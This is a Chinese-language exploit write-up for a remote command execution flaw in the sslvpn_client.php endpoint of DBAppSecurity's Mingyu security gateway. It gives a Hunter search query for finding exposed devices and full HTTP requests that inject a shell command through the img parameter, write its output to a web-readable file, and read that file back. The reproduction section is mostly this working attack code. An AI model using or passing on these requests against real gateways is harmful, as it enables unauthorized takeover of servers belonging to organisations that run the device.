# 安恒明御安全网关sslvpn_client存在远程命令执行漏洞

# 一、漏洞简介
安恒信息明御安全网关<font style="color:rgb(0, 0, 0);">（以下简称“NGFW”）秉持安全可视、简单有效的理念，以资产为视角，构建“事前+事中+事后”全流程防御的下一代安全防护体系，并融合传统防火墙、</font>入侵防御系统<font style="color:rgb(0, 0, 0);">、防病毒网关、上网行为管控、VPN网关、威胁情报等</font>安全模块<font style="color:rgb(0, 0, 0);">于一体的智慧化安全网关。安恒明御安全网关sslvpn_client存在远程命令执行漏洞。攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 安恒明御安全网关

# 三、资产测绘
+ hunter`app.name="安恒明御安全网关"`
+ 特征

![1699939786628-0b13cd03-210c-4d73-9fb2-6198942e15c3.png](./img/pZPH-MQGPlAnSTs8/1699939786628-0b13cd03-210c-4d73-9fb2-6198942e15c3-374710.png)

# 四、漏洞复现
```plain
GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1699939901505-2723aaa1-8c25-4f6b-9817-bdf3c6dd715a.png](./img/pZPH-MQGPlAnSTs8/1699939901505-2723aaa1-8c25-4f6b-9817-bdf3c6dd715a-272346.png)

获取命令执行结果

```plain
GET /sslvpn/ceshi.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1699939937228-26653126-7961-44ef-bda2-0622411e755d.png](./img/pZPH-MQGPlAnSTs8/1699939937228-26653126-7961-44ef-bda2-0622411e755d-150327.png)



> 更新: 2024-02-29 23:57:16  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dg8qpqumcbgb7vgs>